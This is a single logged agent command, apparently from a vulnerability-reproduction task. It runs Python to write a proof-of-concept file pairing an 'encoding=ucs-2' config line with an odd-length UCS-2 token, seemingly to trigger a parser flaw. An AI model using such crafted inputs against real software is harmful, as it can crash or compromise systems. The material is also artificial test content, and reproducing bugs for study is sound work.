message:
Running command: python3 -c "
import sys
# Config section
config = b'encoding=ucs-2\n'
# Empty line to end config
config += b'\n'
# Document section: UCS-2 LE encoded 'xqj' (3 chars = odd length token)
# 'x' = 0x78, 'q' = 0x71, 'j' = 0x6a
doc = b'\x78\x00\x71\x00\x6a\x00'
poc = config + doc
with open('/workspace/poc', 'wb') as f:
    f.write(poc)
print(f'PoC size: {len(poc)} bytes')
print(f'Config: {repr(config)}')
print(f'Doc: {repr(doc)}')
"
